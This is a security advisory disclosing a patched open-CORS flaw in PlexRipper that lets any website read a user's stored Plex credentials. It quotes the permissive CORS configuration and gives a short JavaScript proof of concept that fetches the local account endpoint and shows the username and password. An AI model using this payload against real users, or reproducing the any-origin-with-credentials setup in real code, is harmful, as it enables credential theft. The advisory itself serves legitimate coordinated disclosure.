# GHSL-2024-305: Information disclosure via PlexRipper’s open CORS policy - CVE-2024-49763

[![Author avatar](https://avatars.githubusercontent.com/u/11400619)
Kevin Stubbings](https://github.com/Kwstubbs)

## Coordinated Disclosure Timeline

* 2024-10-17: Vulnerability report submitted via Private Vulnerability Reporting.
* 2024-10-18: Vulnerability fixed in [patch](https://github.com/PlexRipper/PlexRipper/commit/184074644a1f5a8ac59519929a9c4b92280fb2a1)

## Summary

PlexRipper’s open CORS policy allows attackers to gain sensitive information from PlexRipper by getting the user to access the attacker’s domain.

## Project

PlexRipper

## Tested Version

[0.23.2](https://github.com/PlexRipper/PlexRipper/releases/tag/v0.23.2)

## Details

### API leak due to open CORS policy (`GHSL-2024-305`)

PlexRipper allows all websites to make [cross site requests](https://github.com/PlexRipper/PlexRipper/blob/440bb892be9aa15d9dba6f24db1d0984068e7367/src/WebAPI/Startup.cs#L112). This allows an attacking website to access the `/api/PlexAccount` endpoint and steal the user’s Plex login.

```
    public static void ConfigureServices(this IServiceCollection services, IWebHostEnvironment env)
    {
        // Set CORS Configuration
        services.AddCors(options =>
        {
            options.AddPolicy(
                CORSConfiguration,
                builder =>
                {
                    // TODO CORS disabled, otherwise its not working when deployed in a docker container
                    // Solution?
                    builder
                        .AllowAnyHeader()
                        .AllowAnyMethod()
                        // The combo all origin is allowed with allow credentials is needed to make SignalR work from the client.
                        .SetIsOriginAllowed(_ => true)
                        .AllowCredentials();
                }
            );
        });

```
#### Impact

This issue may lead to `Information Disclosure`.

#### Proof Of Concept

If an attacker hosts the following javascript on their website `attacker.com`, any PlexRipper user visiting `attacker.com` may have their credentials stolen. In this proof of concept we print the user’s Plex username and password.

```
<script>
fetch("http://localhost:8989/api/PlexAccount", {
    method: "GET",
})
.then(response => {
    if (!response.ok) {
        throw new Error('Network response was not ok ' + response.statusText);
    }
    return response.json();
})
.then(data => alert("Plex Username: " + data.value[0]["username"] + " Plex Password: " + data.value[0]["password"]))
.catch(error => console.error('There was a problem with your fetch operation:', error));
</script>

```
